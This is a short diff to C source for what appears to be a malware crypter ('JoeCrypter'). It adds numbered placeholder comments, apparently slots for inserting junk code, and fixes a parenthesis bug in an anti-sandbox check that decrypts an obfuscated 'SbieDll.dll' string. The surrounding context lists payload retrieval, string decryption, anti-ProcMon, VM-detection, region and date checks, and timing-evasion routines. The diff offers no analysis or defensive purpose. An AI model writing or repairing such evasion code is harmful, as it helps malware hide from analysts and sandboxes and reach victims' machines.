@@ -16,6 +16,16 @@
 
 
 // function prototypes
+//replaceatbeginning0
+//replaceatbeginning1
+//replaceatbeginning2
+//replaceatbeginning3
+//replaceatbeginning4
+//replaceatbeginning5
+//replaceatbeginning6
+//replaceatbeginning7
+//replaceatbeginning8
+//replaceatbeginning9
 byte *GetPayload(void);
 byte *decrypted(byte *data, int length, int crytptkey);
 WCHAR *widedecrypt(byte *data, int length, int crytptkey);
@@ -49,12 +59,9 @@ void AntiProcMon(void);
 void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
 
-
 //const char g_szClassName[] = "JoeCrypter";
 
-
 DWORD rsrc_len = 0;
-
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
@@ -692,7 +699,7 @@ int reg_enum_vm_check(void)
 
 int AntiEmu(void)
 {
-	if(GetModuleHandle(decrypted("RchdEmm/emm",11,1) !=0) // SbieDll.dll
+	if(GetModuleHandle(decrypted("RchdEmm/emm",11,1)) !=0) // SbieDll.dll
 	{
 	PassToNoobs();
 	}
@@ -1194,3 +1201,13 @@ int timing_evasion_6(void)
 	}
 
 */
+//replacemeatend0
+//replacemeatend1
+//replacemeatend2
+//replacemeatend3
+//replacemeatend4
+//replacemeatend5
+//replacemeatend6
+//replacemeatend7
+//replacemeatend8
+//replacemeatend9
